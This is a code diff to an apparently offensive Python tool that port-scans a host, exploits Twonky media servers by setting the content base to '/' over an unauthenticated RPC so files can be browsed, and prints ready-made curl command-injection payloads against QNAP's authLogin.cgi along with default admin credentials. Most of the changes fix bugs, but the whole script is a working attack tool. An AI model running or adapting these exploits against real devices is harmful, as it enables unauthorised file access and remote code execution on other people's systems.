@@ -74,9 +74,10 @@ def keywordDetector(line):
 
 def checkPort(host, port):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.settimeout(2)
 	try:
 		s.connect((host,int(port)))
-		s.shutdown(2)
+		s.close()
 		return True
 	except:
 		return False
@@ -159,8 +160,8 @@ def discoveryWebservices(host, port, protocol):
 		print (Fore.RED + "*** Exception: SSLError ***")
 	except requests.exceptions.ConnectionError:
 		print (Fore.RED + "*** Exception: ConnectionError ***")
-class Twonky():
-	def setContentBase(host, port):
+class Twonky:
+	def setContentBase(self, host, port):
 		print (Fore.MAGENTA + "*** Set 'contentbase' path to '/'' ***")
 		payload = "\ncontentbase=/\n"
 		url = "http://{0}:{1}/rpc/set_all".format(host, port)
@@ -175,7 +176,7 @@ class Twonky():
 			print (Fore.RED + "*** Timeout while setting contentbase path to '/' ***")
 			sys.exit()
 
-	def browser(host, port, version):
+	def browser(self, host, port, version):
 		while True:
 			var = raw_input("path nr: ")
 			if var != "exit" and var != "exploit":
@@ -216,16 +217,16 @@ class Twonky():
 			elif var == "exit":
 				sys.exit()
 
-	def serverInfo(host, port):
+	def serverInfo(self, host, port):
 		print (Fore.MAGENTA + "*** Get Serverdetails ***")
 		url = "http://{0}:{1}/rpc/get_friendlyname".format(host, port)
-		friendlyname = requests.get(url, timeout=2)
+		friendlyname = requests.get(url, timeout=5)
 		if friendlyname.status_code == 200:
 			print (Fore.GREEN + "Server Name: {0}".format(friendlyname.text))
 		else:
-			print (Fore.RED + "*** Not authorized to access settings ***")
+			print (Fore.RED + "*** Not authorized to access settings, password protection active! ***")
 		url = "http://{0}:{1}/rpc/info_status".format(host, port)
-		version = requests.get(url, timeout=2)
+		version = requests.get(url, timeout=5)
 		for line in version.iter_lines():
 			if line :
 				if line.find("version") != -1:
@@ -238,7 +239,7 @@ class Twonky():
 					print (Fore.GREEN + "Serverplatform: {0}".format(serverPlatform))
 					if serverPlatform.find("qnap") != -1:
 						print (Fore.GREEN + "*** QNAP Server discovered ***")
-						print (Fore.GREE + "\rhttps://sintonen.fi/advisories/qnap-qts-multiple-rce-vulnerabilities.txt")
+						print (Fore.GREEN + "\rhttps://sintonen.fi/advisories/qnap-qts-multiple-rce-vulnerabilities.txt")
 						print (Fore.GREEN + "\r$ curl -ki \"https://{0}/cgi-bin/authLogin.cgi?reboot_notice_msg=$(printf 'QNAPVJBD%08d%16s  14`(echo;id)>&2`' $(expr $(date +%s) % 100000000) Disconnect|base64|tr -d '\\r\\n')\"".format(host))
 						print (Fore.GREEN + "\r$ curl -ki \"https://{0}:8080/cgi-bin/authLogin.cgi?reboot_notice_msg=$(printf 'QNAPVJBD%08d%16s  14`(echo;id)>&2`' $(expr $(date +%s) % 100000000) Disconnect|base64|tr -d '\\r\\n')\"".format(host))
 						print (Fore.GREEN + "\rTry default login creds: admin:admin")
@@ -276,6 +277,7 @@ if __name__ == '__main__':
 		host = sys.argv[1]
 		print (Fore.MAGENTA + "https://www.shodan.io/host/{0}".format(host))
 		ports = ["21", "2121", "22", "2222", "80", "443", "5000", "8080", "8081", "8083", "8000", "8443", "9000", "9001", "9002", "9251"]
+		print (Fore.MAGENTA + "*** Start port discovery ***")
 		for port in ports:
 			if checkPort(host, port):
 				print (Fore.GREEN + "*** Port {0} opened ***".format(port))
@@ -300,6 +302,7 @@ if __name__ == '__main__':
 				elif port == "9000" or port == "9001" or port == "9002":
 					twonky = raw_input("Run Twonky browser on port {0} [default N]? [Y, N] ".format(port))
 					if twonky.upper() == "Y":
+						Twonky = Twonky()
 						versionNumber = Twonky.serverInfo(host, port)
 						if Twonky.setContentBase(host, port):
 							Twonky.browser(host, port, versionNumber)
